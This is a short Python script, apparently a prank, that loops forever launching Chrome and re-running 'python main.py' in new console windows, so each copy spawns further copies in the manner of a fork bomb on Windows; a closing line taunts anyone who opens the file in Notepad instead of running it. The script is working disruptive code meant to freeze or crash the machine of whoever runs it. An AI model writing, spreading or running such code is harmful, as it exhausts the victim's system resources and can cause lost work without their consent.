import os
import subprocess
import threading


def main():

    def open1():
        while True:
            os.system('start chrome')
            subprocess.call('python main.py', creationflags=subprocess.CREATE_NEW_CONSOLE)

    t1 = threading.Thread(target=open1())
    t2 = threading.Thread(target=open1())
    t3 = threading.Thread(target=open1())
    t4 = threading.Thread(target=open1())
    t1.start()
    t2.start()
    t3.start()
    t4.start()


if __name__ == '__main__':
    main()

    
hey hey why are u opening this on notepad not cool !! 
